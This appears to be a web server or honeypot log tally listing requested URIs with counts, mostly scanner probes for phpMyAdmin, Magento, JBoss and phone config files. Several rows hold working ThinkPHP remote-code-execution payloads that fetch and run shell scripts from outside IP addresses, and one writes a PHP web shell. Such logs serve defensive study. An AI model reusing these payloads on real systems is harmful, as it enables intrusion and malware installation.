uri	uri_count
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20176.32.33.124/zzta	1
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20176.32.33.124/zzt	1
/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%2046.30.43.159:81/zzt	1
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://133.32.201.14/phpmyadmin/a_thk.sh%20-O%20/tmp/a_thk;%20chmod%200777%20/tmp/a_thk;%20/tmp/a_thk;	1
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://84.104.112.92/a_thk.sh%20-O%20/tmp/a_thk;%20chmod%200777%20/tmp/a_thk;%20/tmp/a_thk;	1
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://86.105.49.215/a.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;	1
/index.php?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D	1
/index2.action	1
/info.cgi	1
/info/wp-login.php	1
/install/index.php	1
/install/lib/ajaxhandlers/ajaxserversettingschk.php?rootuname=;echo%20-n%20hellorconfig%7Cmd5sum%20%23	1
/invoker/readonly/JMXInvokerServlet	1
/jackpos/loading.php	1
/jackposprivate12/loading.php	1
/jackposv1/loading.php	1
/jackposv2/loading.php	1
/jacpos/loading.php	1
/jbossass/jbossass.jsp?ppp=echo%20D3c3mb3r	1
/jetspeed/portal/content/	1
/jexinv4/jexinv4.jsp	1
/jexws2/jexsw2.jsp?ppp=echo%20D3c3mb3r	1
/jexws4/jexws4.jsp	1
/jk/loading.php	1
/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo	1
/kkssskk.txt	1
/kp/loading.php	1
/lKWKULaWxl.jsp/	1
/lfm.php	1
/line/	1
/link/wp-login.php	1
/loading.php	1
/login.action/SB360.txt	1
/login.action/shell.jsp?f=SB360.txt&t=hello,SB360	1
/login.php3	1
/magento/	1
/magento/admin/	1
/magento/downloader/index.php	1
/magento/errors/503.php	1
/magento/index.php/admin/	1
/magento/pub/errors/503.php	1
/magento2/	1
/magento2/admin/	1
/magento2/pub/errors/503.php	1
/magmi/conf/magmi.ini	1
/mail/accountsettings_add.html	1
/management/	1
/managerml/	1
/master/	1
/media/vuln.txt	1
/mjpg/video.mjpg?COUNTER	1
/mobile.asp	1
/mproxy	1
/mrtg-rrd/RRGrapher.cgi	1
/mrtg/	1
/mrtg/mrtg-rrd/RRGrapher.cgi	1
/msd-1.24.4/index.php	1
/msd/index.php	1
/msd/sql.php	1
/msd1	1
/msd1.24.2/sql.php	1
/msd1.24.3/sql.php	1
/msd1.24.4/index.php	1
/msd1.24.4/sql.php	1
/msd1.24stable/sql.php	1
/myadmin/print.css	1
/myadmin/setup.php	1
/myadmin/sql.php	1
/mysql-admin	1
/mysql-admin/setup.php	1
/mysql/admin	1
/mysql/admin/scripts/setup.php	1
/mysql/dbadmin	1
/mysql/mysqlmanager	1
/mysql/pMA	1
/mysql/pma	1
/mysql/sql.php	1
/mysql/sqlmanager	1
/mysql/web	1
/mysql_dumper/index.php	1
/mysqladminconfig/setup.php	1
/mysqldumper-1.24.4/index.php	1
/mysqldumper/index.php	1
/mysqldumper/sql.php	1
/mysqlmanager/setup.php	1
/new1/wp-login.php	1
/nmaplowercheck1502645791	1
/nmaplowercheck1506846199	1
/nmaplowercheck1526089399	1
/nmaplowercheck1526665685	1
/nmaplowercheck1529037290	1
/nmaplowercheck1529474511	1
/nmaplowercheck1531582878	1
/nmaplowercheck1532035489	1
/nmaplowercheck1534126511	1
/nmaplowercheck1534566022	1
/nmaplowercheck1539312054	1
/nmaplowercheck1539773292	1
/nmaplowercheck1541807842	1
/nmaplowercheck1542301622	1
/nmaplowercheck1544536069	1
/nmaplowercheck1544993973	1
/nmaplowercheck1547241710	1
/nmaplowercheck1547717404	1
/nmaplowercheck1550835110	1
/nmaplowercheck1551181815	1
/nmaplowercheck1552384840	1
/nmaplowercheck1552422041	1
/nmaplowercheck1552554640	1
/nmaplowercheck1552575491	1
/nmaplowercheck1552618700	1
/nmaplowercheck1552982560	1
/nmaplowercheck1553942726	1
/nmaplowercheck1553964567	1
/nmaplowercheck1555268483	1
/nmaplowercheck1555646532	1
/nmaplowercheck1556437848	1
/nmaplowercheck1556452707	1
/nmaplowercheck1557574467	1
/nmaplowercheck1560068197	1
/nmaplowercheck1563308498	1
/nmaplowercheck1563662191	1
/nmaplowercheck1564643224	1
/nmaplowercheck1565425565	1
/nmaplowercheck1568610593	1
/nmaplowercheck1570779687	1
/nmaplowercheck1573314131	1
/nmaplowercheck1574737764	1
/nmaplowercheck1575014049	1
/nmaplowercheck1576059238	1
/nmaplowercheck1576102905	1
/nmaplowercheck1576547870	1
/nmaplowercheck1576575668	1
/notFound.action	1
/obihai/	1
/off	1
/oneshotimage1?COUNTER	1
/overides/	1
/owa/auth/logon.aspx	1
/p/m/a/index.php	1
/panasonic/	1
/panel/loading.php	1
/panel2asdasd/up.php	1
/pass.cfg	1
/pbx/	1
/phone/000000000000.cfg	1
/phone/configs/000000000000.cfg	1
/phoneprov/	1
/phoneprov/000000000000-phone.cfg	1
/phoneprov/000000000000.cfg	1
/phones/y000000000000.cfg	1
/phpAdmin/scripts/setup.php	1
/phpMyAdmi/scripts/setup.php	1
/phpMyAdmin-2	1
/phpMyAdmin-2.11.1.0/scripts/setup.php	1
/phpMyAdmin-2.11.1.2/scripts/setup.php	1
/phpMyAdmin-2.2.3/scripts/setup.php	1
/phpMyAdmin-2.5.5-pl1/scripts/setup.php	1
/phpMyAdmin-2.5.5-rc2/scripts/setup.php	1
/phpMyAdmin-2.5.5/index.php	1
/phpMyAdmin-2.5.6/scripts/setup.php	1
/phpMyAdmin-2.5.7/scripts/setup.php	1
/phpMyAdmin-2.6.0-alpha2/scripts/setup.php	1
/phpMyAdmin-2.6.0-beta1/scripts/setup.php	1
/phpMyAdmin-2.6.0-beta2/scripts/setup.php	1
/phpMyAdmin-2.6.0-rc1/scripts/setup.php	1
/phpMyAdmin-2.6.0-rc2/scripts/setup.php	1
/phpMyAdmin-2.6.0/scripts/setup.php	1
/phpMyAdmin-2.6.1-pl1/scripts/setup.php	1
/phpMyAdmin-2.6.1-rc1/scripts/setup.php	1
/phpMyAdmin-2.6.3-pl1/scripts/setup.php	1
/phpMyAdmin-2.6.3/scripts/setup.php	1
/phpMyAdmin-2.6.4-pl2/scripts/setup.php	1
/phpMyAdmin-2.6.5/scripts/setup.php	1
/phpMyAdmin-2.7.0-beta1/scripts/setup.php	1
/phpMyAdmin-2.7.0-pl1/scripts/setup.php	1
/phpMyAdmin-2.7.0-pl2/scripts/setup.php	1
/phpMyAdmin-2.7.7/scripts/setup.php	1
/phpMyAdmin-2.8.0	1
/phpMyAdmin-2.8.0-rc1	1
/phpMyAdmin-2.8.0-rc2	1
/phpMyAdmin-2.8.0.1	1
/phpMyAdmin-2.8.0.2	1
/phpMyAdmin-2.8.0.3	1
/phpMyAdmin-2.8.0.3/scripts/setup.php	1
/phpMyAdmin-2.8.0.4	1
/phpMyAdmin-2.8.1	1
/phpMyAdmin-2.8.1-rc1	1
/phpMyAdmin-2.8.2	1
/phpMyAdmin-2.8.2.1	1
/phpMyAdmin-2.8.2.2	1
/phpMyAdmin-2.8.2.3	1
/phpMyAdmin-2.8.2.3/scripts/setup.php	1
/phpMyAdmin-2.8.2.4	1
/phpMyAdmin-2.8.8/scripts/setup.php	1
/phpMyAdmin-2.9.0	1
/phpMyAdmin-2.9.0-beta1	1
/phpMyAdmin-2.9.0-rc1	1
/phpMyAdmin-2.9.0-rc1/scripts/setup.php	1
/phpMyAdmin-2.9.0.1	1
/phpMyAdmin-2.9.0.2	1
/phpMyAdmin-2.9.0.2/scripts/setup.php	1
/phpMyAdmin-2.9.0.3	1
/phpMyAdmin-2.9.1	1
/phpMyAdmin-2.9.1-rc1	1
/phpMyAdmin-2.9.1-rc2	1
/phpMyAdmin-2.9.1.1	1
/phpMyAdmin-2.9.2	1
/phpMyAdmin-2.9.2-rc1	1
/phpMyAdmin-3	1
/phpMyAdmin-3.0.0	1
/phpMyAdmin-3.0.0-alpha	1
/phpMyAdmin-3.0.0-beta	1
/phpMyAdmin-3.0.0-rc1	1
/phpMyAdmin-3.0.0-rc2	1
/phpMyAdmin-3.0.1	1
/phpMyAdmin-3.0.1-rc1	1
/phpMyAdmin-3.1.0	1
/phpMyAdmin-3.1.0-beta1	1
/phpMyAdmin-3.1.0-rc1	1
/phpMyAdmin-3.1.0.0-english/scripts/setup.php	1
/phpMyAdmin-3.1.0.0/scripts/setup.php	1
/phpMyAdmin-3.1.1	1
/phpMyAdmin-3.1.1-rc1	1
/phpMyAdmin-3.1.2	1
/phpMyAdmin-3.1.2-rc1	1
/phpMyAdmin-3.1.2.0/scripts/setup.php	1
/phpMyAdmin-3.1.3	1
/phpMyAdmin-3.1.3-rc1	1
/phpMyAdmin-3.1.3.1	1
/phpMyAdmin-3.1.3.2	1
/phpMyAdmin-3.1.4	1
/phpMyAdmin-3.1.4-rc1	1
/phpMyAdmin-3.1.4-rc2	1
/phpMyAdmin-3.1.5	1
/phpMyAdmin-3.1.5-rc1	1
/phpMyAdmin-3.2.0	1
/phpMyAdmin-3.2.0-beta1	1
/phpMyAdmin-3.2.0-rc1	1
/phpMyAdmin-3.2.0.1	1
/phpMyAdmin-3.2.1	1
/phpMyAdmin-3.2.1-rc1	1
/phpMyAdmin-3.2.2	1
/phpMyAdmin-3.2.2-rc1	1
/phpMyAdmin-3.2.2.1	1
/phpMyAdmin-3.2.3	1
/phpMyAdmin-3.2.3-rc1	1
/phpMyAdmin-3.2.4-rc1	1
/phpMyAdmin-3.2.5	1
/phpMyAdmin-3.2.5-rc1	1
/phpMyAdmin-3.2.5-rc2	1
/phpMyAdmin-3.3.0	1
/phpMyAdmin-3.3.0-alpha1	1
/phpMyAdmin-3.3.0-beta1	1
/phpMyAdmin-3.3.0-rc1	1
/phpMyAdmin-3.3.0-rc2	1
/phpMyAdmin-3.3.0-rc3	1
/phpMyAdmin-3.3.1	1
/phpMyAdmin-3.3.1-rc1	1
/phpMyAdmin-3.3.10	1
/phpMyAdmin-3.3.10-rc1	1
/phpMyAdmin-3.3.10.1	1
/phpMyAdmin-3.3.10.2	1
/phpMyAdmin-3.3.10.3	1
/phpMyAdmin-3.3.10.4	1
/phpMyAdmin-3.3.10.5	1
/phpMyAdmin-3.3.10.5/import.php	1
/phpMyAdmin-3.3.10/import.php	1
/phpMyAdmin-3.3.2-rc1	1
/phpMyAdmin-3.3.2-rc1/import.php	1
/phpMyAdmin-3.3.3	1
/phpMyAdmin-3.3.3-rc1	1
/phpMyAdmin-3.3.3-rc1/import.php	1
/phpMyAdmin-3.3.3/import.php	1
/phpMyAdmin-3.3.4	1
/phpMyAdmin-3.3.4-rc1	1
/phpMyAdmin-3.3.4-rc1/import.php	1
/phpMyAdmin-3.3.4/import.php	1
/phpMyAdmin-3.3.5	1
/phpMyAdmin-3.3.5-rc1	1
/phpMyAdmin-3.3.5-rc1/import.php	1
/phpMyAdmin-3.3.5.1	1
/phpMyAdmin-3.3.5.1-all-languages	1
/phpMyAdmin-3.3.5.1-all-languages/import.php	1
/phpMyAdmin-3.3.5.1/import.php	1
/phpMyAdmin-3.3.5/import.php	1
/phpMyAdmin-3.3.6	1
/phpMyAdmin-3.3.6-rc1	1
/phpMyAdmin-3.3.6-rc1/import.php	1
/phpMyAdmin-3.3.6/import.php	1
/phpMyAdmin-3.3.7	1
/phpMyAdmin-3.3.7-rc1	1
/phpMyAdmin-3.3.7-rc1/import.php	1
/phpMyAdmin-3.3.7/import.php	1
/phpMyAdmin-3.3.8	1
/phpMyAdmin-3.3.8-rc1	1
/phpMyAdmin-3.3.8-rc1/import.php	1
/phpMyAdmin-3.3.8.1	1
/phpMyAdmin-3.3.8.1/import.php	1
/phpMyAdmin-3.3.8/import.php	1
/phpMyAdmin-3.3.9	1
/phpMyAdmin-3.3.9-rc1	1
/phpMyAdmin-3.3.9-rc1/import.php	1
/phpMyAdmin-3.3.9.1	1
/phpMyAdmin-3.3.9.1/import.php	1
/phpMyAdmin-3.3.9.2	1
/phpMyAdmin-3.3.9.2/import.php	1
/phpMyAdmin-3.3.9/import.php	1
/phpMyAdmin-3.4.0	1
/phpMyAdmin-3.4.0-alpha1	1
/phpMyAdmin-3.4.0-alpha1/import.php	1
/phpMyAdmin-3.4.0-alpha2	1
/phpMyAdmin-3.4.0-alpha2/import.php	1
/phpMyAdmin-3.4.0-beta1	1
/phpMyAdmin-3.4.0-beta1/import.php	1
/phpMyAdmin-3.4.0-beta2	1
/phpMyAdmin-3.4.0-beta2/import.php	1
/phpMyAdmin-3.4.0-beta3	1
/phpMyAdmin-3.4.0-beta3/import.php	1
/phpMyAdmin-3.4.0-beta4	1
/phpMyAdmin-3.4.0-beta4/import.php	1
/phpMyAdmin-3.4.0-rc1	1
/phpMyAdmin-3.4.0-rc1/import.php	1
/phpMyAdmin-3.4.0-rc2	1
/phpMyAdmin-3.4.0-rc2/import.php	1
/phpMyAdmin-3.4.0/import.php	1
/phpMyAdmin-3.4.1	1
/phpMyAdmin-3.4.1-rc1	1
/phpMyAdmin-3.4.1-rc1/import.php	1
/phpMyAdmin-3.4.1/import.php	1
/phpMyAdmin-3.4.10	1
/phpMyAdmin-3.4.10-rc1	1
/phpMyAdmin-3.4.10-rc1/import.php	1
/phpMyAdmin-3.4.10.1	1
/phpMyAdmin-3.4.10.1/import.php	1
/phpMyAdmin-3.4.10.2	1
/phpMyAdmin-3.4.10.2/import.php	1
/phpMyAdmin-3.4.10/import.php	1
/phpMyAdmin-3.4.11	1
/phpMyAdmin-3.4.11-rc1	1
/phpMyAdmin-3.4.11-rc1/import.php	1
/phpMyAdmin-3.4.11.1	1
/phpMyAdmin-3.4.11.1-1	1
/phpMyAdmin-3.4.11.1-1/import.php	1
/phpMyAdmin-3.4.11.1/import.php	1
/phpMyAdmin-3.4.11/import.php	1
/phpMyAdmin-3.4.2	1
/phpMyAdmin-3.4.2-rc1	1
/phpMyAdmin-3.4.2-rc1/import.php	1
/phpMyAdmin-3.4.2/import.php	1
/phpMyAdmin-3.4.3	1
/phpMyAdmin-3.4.3-rc1	1
/phpMyAdmin-3.4.3-rc1/import.php	1
/phpMyAdmin-3.4.3.1	1
/phpMyAdmin-3.4.3.1/import.php	1
/phpMyAdmin-3.4.3.2	1
/phpMyAdmin-3.4.3.2/import.php	1
/phpMyAdmin-3.4.3/import.php	1
/phpMyAdmin-3.4.4	1
/phpMyAdmin-3.4.4-rc1	1
/phpMyAdmin-3.4.4-rc1/import.php	1
/phpMyAdmin-3.4.4/import.php	1
/phpMyAdmin-3.4.5	1
/phpMyAdmin-3.4.5-rc1	1
/phpMyAdmin-3.4.5-rc1/import.php	1
/phpMyAdmin-3.4.5/import.php	1
/phpMyAdmin-3.4.6	1
/phpMyAdmin-3.4.6-rc1	1
/phpMyAdmin-3.4.6-rc1/import.php	1
/phpMyAdmin-3.4.6/import.php	1
/phpMyAdmin-3.4.7	1
/phpMyAdmin-3.4.7-rc1	1
/phpMyAdmin-3.4.7-rc1/import.php	1
/phpMyAdmin-3.4.7.1	1
/phpMyAdmin-3.4.7.1/import.php	1
/phpMyAdmin-3.4.7/import.php	1
/phpMyAdmin-3.4.8	1
/phpMyAdmin-3.4.8-rc1	1
/phpMyAdmin-3.4.8-rc1/import.php	1
/phpMyAdmin-3.4.8/import.php	1
/phpMyAdmin-3.4.9	1
/phpMyAdmin-3.4.9-rc1	1
/phpMyAdmin-3.4.9-rc1/import.php	1
/phpMyAdmin-3.4.9/import.php	1
/phpMyAdmin-3.5.0	1
/phpMyAdmin-3.5.0-alpha1	1
/phpMyAdmin-3.5.0-alpha1/import.php	1
/phpMyAdmin-3.5.0-beta1	1
/phpMyAdmin-3.5.0-beta1/import.php	1
/phpMyAdmin-3.5.0-rc1	1
/phpMyAdmin-3.5.0-rc1/import.php	1
/phpMyAdmin-3.5.0-rc2	1
/phpMyAdmin-3.5.0-rc2/import.php	1
/phpMyAdmin-3.5.0/import.php	1
/phpMyAdmin-3.5.1	1
/phpMyAdmin-3.5.1-rc1	1
/phpMyAdmin-3.5.1-rc1/import.php	1
/phpMyAdmin-3.5.1/import.php	1
/phpMyAdmin-3.5.2	1
/phpMyAdmin-3.5.2-rc1	1
/phpMyAdmin-3.5.2-rc1/import.php	1
/phpMyAdmin-3.5.2.1	1
/phpMyAdmin-3.5.2.1/import.php	1
/phpMyAdmin-3.5.2.2	1
/phpMyAdmin-3.5.2.2/import.php	1
/phpMyAdmin-3.5.2/import.php	1
/phpMyAdmin-3.5.3	1
/phpMyAdmin-3.5.3-rc1	1
/phpMyAdmin-3.5.3-rc1/import.php	1
/phpMyAdmin-3.5.3/import.php	1
/phpMyAdmin-3.5.4	1
/phpMyAdmin-3.5.4-rc1	1
/phpMyAdmin-3.5.4-rc1/import.php	1
/phpMyAdmin-3.5.4/import.php	1
/phpMyAdmin-3.5.5	1
/phpMyAdmin-3.5.5-rc1	1
/phpMyAdmin-3.5.5-rc1/import.php	1
/phpMyAdmin-3.5.5/import.php	1
/phpMyAdmin-3.5.6	1
/phpMyAdmin-3.5.6-rc1	1
/phpMyAdmin-3.5.6-rc1/import.php	1
/phpMyAdmin-3.5.6/import.php	1
/phpMyAdmin-3.5.7	1
/phpMyAdmin-3.5.7-1	1
/phpMyAdmin-3.5.7-1/import.php	1
/phpMyAdmin-3.5.7-rc1	1
/phpMyAdmin-3.5.7-rc1/import.php	1
/phpMyAdmin-3.5.7/import.php	1
/phpMyAdmin-3.5.8	1
/phpMyAdmin-3.5.8-rc1	1
/phpMyAdmin-3.5.8-rc1/import.php	1
/phpMyAdmin-3.5.8.1	1
/phpMyAdmin-3.5.8.1/import.php	1
/phpMyAdmin-3.5.8.2	1
/phpMyAdmin-3.5.8.2/import.php	1
/phpMyAdmin-3.5.8/import.php	1
/phpMyAdmin-4.0.0	1
/phpMyAdmin-4.0.0-alpha1	1
/phpMyAdmin-4.0.0-alpha1/import.php	1
/phpMyAdmin-4.0.0-alpha2	1
/phpMyAdmin-4.0.0-alpha2/import.php	1
/phpMyAdmin-4.0.0-beta1	1
/phpMyAdmin-4.0.0-beta1/import.php	1
/phpMyAdmin-4.0.0-beta2	1
/phpMyAdmin-4.0.0-beta2/import.php	1
/phpMyAdmin-4.0.0-beta3	1
/phpMyAdmin-4.0.0-beta3/import.php	1
/phpMyAdmin-4.0.0-rc1	1
/phpMyAdmin-4.0.0-rc1/import.php	1
/phpMyAdmin-4.0.0-rc2	1
/phpMyAdmin-4.0.0-rc2/import.php	1
/phpMyAdmin-4.0.0-rc3	1
/phpMyAdmin-4.0.0-rc3/import.php	1
/phpMyAdmin-4.0.0-rc4	1
/phpMyAdmin-4.0.0-rc4/import.php	1
/phpMyAdmin-4.0.0/import.php	1
/phpMyAdmin-4.0.1	1
/phpMyAdmin-4.0.1-rc1	1
/phpMyAdmin-4.0.1-rc1/import.php	1
/phpMyAdmin-4.0.1/import.php	1
/phpMyAdmin-4.0.10	1
/phpMyAdmin-4.0.10.1	1
/phpMyAdmin-4.0.10.1/import.php	1
/phpMyAdmin-4.0.10.2	1
/phpMyAdmin-4.0.10.2/import.php	1
/phpMyAdmin-4.0.10.3	1
/phpMyAdmin-4.0.10.3/import.php	1
/phpMyAdmin-4.0.10.4	1
/phpMyAdmin-4.0.10.4/import.php	1
/phpMyAdmin-4.0.10.5	1
/phpMyAdmin-4.0.10.5/import.php	1
/phpMyAdmin-4.0.10.6	1
/phpMyAdmin-4.0.10.6/import.php	1
/phpMyAdmin-4.0.10.7	1
/phpMyAdmin-4.0.10.7/import.php	1
/phpMyAdmin-4.0.10.8	1
/phpMyAdmin-4.0.10.8/import.php	1
/phpMyAdmin-4.0.10.9	1
/phpMyAdmin-4.0.10.9/import.php	1
/phpMyAdmin-4.0.10/import.php	1
/phpMyAdmin-4.0.2	1
/phpMyAdmin-4.0.2-rc1	1
/phpMyAdmin-4.0.2-rc1/import.php	1
/phpMyAdmin-4.0.2/import.php	1
/phpMyAdmin-4.0.3	1
/phpMyAdmin-4.0.3-rc1	1
/phpMyAdmin-4.0.3-rc1/import.php	1
/phpMyAdmin-4.0.3/import.php	1
/phpMyAdmin-4.0.4	1
/phpMyAdmin-4.0.4-rc1	1
/phpMyAdmin-4.0.4-rc1/import.php	1
/phpMyAdmin-4.0.4.1	1
/phpMyAdmin-4.0.4.1/import.php	1
/phpMyAdmin-4.0.4.2	1
/phpMyAdmin-4.0.4.2/import.php	1
/phpMyAdmin-4.0.4/import.php	1
/phpMyAdmin-4.0.5	1
/phpMyAdmin-4.0.5-rc1	1
/phpMyAdmin-4.0.5-rc1/import.php	1
/phpMyAdmin-4.0.5-rc2	1
/phpMyAdmin-4.0.5-rc2/import.php	1
/phpMyAdmin-4.0.5/import.php	1
/phpMyAdmin-4.0.6	1
/phpMyAdmin-4.0.6-rc1	1
/phpMyAdmin-4.0.6-rc1/import.php	1
/phpMyAdmin-4.0.6-rc2	1
/phpMyAdmin-4.0.6-rc2/import.php	1
/phpMyAdmin-4.0.6/import.php	1
/phpMyAdmin-4.0.7	1
/phpMyAdmin-4.0.7-rc1	1
/phpMyAdmin-4.0.7-rc1/import.php	1
/phpMyAdmin-4.0.7/import.php	1
/phpMyAdmin-4.0.8	1
/phpMyAdmin-4.0.8-rc1	1
/phpMyAdmin-4.0.8-rc1/import.php	1
/phpMyAdmin-4.0.8/import.php	1
/phpMyAdmin-4.0.9	1
/phpMyAdmin-4.0.9-rc1	1
/phpMyAdmin-4.0.9-rc1/import.php	1
/phpMyAdmin-4.0.9/import.php	1
/phpMyAdmin-4.1.0	1
/phpMyAdmin-4.1.0-alpha1	1
/phpMyAdmin-4.1.0-alpha1/import.php	1
/phpMyAdmin-4.1.0-alpha2	1
/phpMyAdmin-4.1.0-alpha2/import.php	1
/phpMyAdmin-4.1.0-beta1	1
/phpMyAdmin-4.1.0-beta1/import.php	1
/phpMyAdmin-4.1.0-beta2	1
/phpMyAdmin-4.1.0-beta2/import.php	1
/phpMyAdmin-4.1.0-rc1	1
/phpMyAdmin-4.1.0-rc1/import.php	1
/phpMyAdmin-4.1.0-rc2	1
/phpMyAdmin-4.1.0-rc2/import.php	1
/phpMyAdmin-4.1.0-rc3	1
/phpMyAdmin-4.1.0-rc3/import.php	1
/phpMyAdmin-4.1.0/import.php	1
/phpMyAdmin-4.1.1	1
/phpMyAdmin-4.1.1/import.php	1
/phpMyAdmin-4.1.10	1
/phpMyAdmin-4.1.10/import.php	1
/phpMyAdmin-4.1.11	1
/phpMyAdmin-4.1.11/import.php	1
/phpMyAdmin-4.1.12	1
/phpMyAdmin-4.1.12/import.php	1
/phpMyAdmin-4.1.13	1
/phpMyAdmin-4.1.13/import.php	1
/phpMyAdmin-4.1.14	1
/phpMyAdmin-4.1.14.1	1
/phpMyAdmin-4.1.14.1/import.php	1
/phpMyAdmin-4.1.14.2	1
/phpMyAdmin-4.1.14.2/import.php	1
/phpMyAdmin-4.1.14.3	1
/phpMyAdmin-4.1.14.3/import.php	1
/phpMyAdmin-4.1.14.4	1
/phpMyAdmin-4.1.14.4/import.php	1
/phpMyAdmin-4.1.14.5	1
/phpMyAdmin-4.1.14.5/import.php	1
/phpMyAdmin-4.1.14.6	1
/phpMyAdmin-4.1.14.6/import.php	1
/phpMyAdmin-4.1.14.7	1
/phpMyAdmin-4.1.14.7/import.php	1
/phpMyAdmin-4.1.14.8	1
/phpMyAdmin-4.1.14.8/import.php	1
/phpMyAdmin-4.1.14/import.php	1
/phpMyAdmin-4.1.2	1
/phpMyAdmin-4.1.2/import.php	1
/phpMyAdmin-4.1.3	1
/phpMyAdmin-4.1.3/import.php	1
/phpMyAdmin-4.1.4	1
/phpMyAdmin-4.1.4/import.php	1
/phpMyAdmin-4.1.5	1
/phpMyAdmin-4.1.5/import.php	1
/phpMyAdmin-4.1.6	1
/phpMyAdmin-4.1.6/import.php	1
/phpMyAdmin-4.1.7	1
/phpMyAdmin-4.1.7/import.php	1
/phpMyAdmin-4.1.8	1
/phpMyAdmin-4.1.8/import.php	1
/phpMyAdmin-4.1.9	1
/phpMyAdmin-4.1.9/import.php	1
/phpMyAdmin-4.2.0	1
/phpMyAdmin-4.2.0-alpha1	1
/phpMyAdmin-4.2.0-alpha1/import.php	1
/phpMyAdmin-4.2.0-alpha2	1
/phpMyAdmin-4.2.0-alpha2/import.php	1
/phpMyAdmin-4.2.0-beta1	1
/phpMyAdmin-4.2.0-beta1/import.php	1
/phpMyAdmin-4.2.0-rc1	1
/phpMyAdmin-4.2.0-rc1/import.php	1
/phpMyAdmin-4.2.0/import.php	1
/phpMyAdmin-4.2.1	1
/phpMyAdmin-4.2.1-english/import.php	1
/phpMyAdmin-4.2.1/import.php	1
/phpMyAdmin-4.2.10	1
/phpMyAdmin-4.2.10.1	1
/phpMyAdmin-4.2.10.1/import.php	1
/phpMyAdmin-4.2.10/import.php	1
/phpMyAdmin-4.2.11	1
/phpMyAdmin-4.2.11/import.php	1
/phpMyAdmin-4.2.12	1
/phpMyAdmin-4.2.12/import.php	1
/phpMyAdmin-4.2.13	1
/phpMyAdmin-4.2.13.1	1
/phpMyAdmin-4.2.13.1/import.php	1
/phpMyAdmin-4.2.13.2	1
/phpMyAdmin-4.2.13.2/import.php	1
/phpMyAdmin-4.2.13/import.php	1
/phpMyAdmin-4.2.2	1
/phpMyAdmin-4.2.2/import.php	1
/phpMyAdmin-4.2.3	1
/phpMyAdmin-4.2.3/import.php	1
/phpMyAdmin-4.2.4	1
/phpMyAdmin-4.2.4/import.php	1
/phpMyAdmin-4.2.5	1
/phpMyAdmin-4.2.5/import.php	1
/phpMyAdmin-4.2.6	1
/phpMyAdmin-4.2.6/import.php	1
/phpMyAdmin-4.2.7	1
/phpMyAdmin-4.2.7.1	1
/phpMyAdmin-4.2.7.1/import.php	1
/phpMyAdmin-4.2.7/import.php	1
/phpMyAdmin-4.2.8	1
/phpMyAdmin-4.2.8.1	1
/phpMyAdmin-4.2.8.1/import.php	1
/phpMyAdmin-4.2.8/import.php	1
/phpMyAdmin-4.2.9	1
/phpMyAdmin-4.2.9.1	1
/phpMyAdmin-4.2.9.1/import.php	1
/phpMyAdmin-4.2.9/import.php	1
/phpMyAdmin-4.3.0	1
/phpMyAdmin-4.3.0-alpha1	1
/phpMyAdmin-4.3.0-alpha1/import.php	1
/phpMyAdmin-4.3.0-beta1	1
/phpMyAdmin-4.3.0-beta1/import.php	1
/phpMyAdmin-4.3.0-rc1	1
/phpMyAdmin-4.3.0-rc1/import.php	1
/phpMyAdmin-4.3.0-rc2	1
/phpMyAdmin-4.3.0-rc2/import.php	1
/phpMyAdmin-4.3.0/import.php	1
/phpMyAdmin-4.3.1	1
/phpMyAdmin-4.3.1/import.php	1
/phpMyAdmin-4.3.10	1
/phpMyAdmin-4.3.10/import.php	1
/phpMyAdmin-4.3.11	1
/phpMyAdmin-4.3.11.1	1
/phpMyAdmin-4.3.11.1/import.php	1
/phpMyAdmin-4.3.11/import.php	1
/phpMyAdmin-4.3.12	1
/phpMyAdmin-4.3.12/import.php	1
/phpMyAdmin-4.3.13	1
/phpMyAdmin-4.3.13/import.php	1
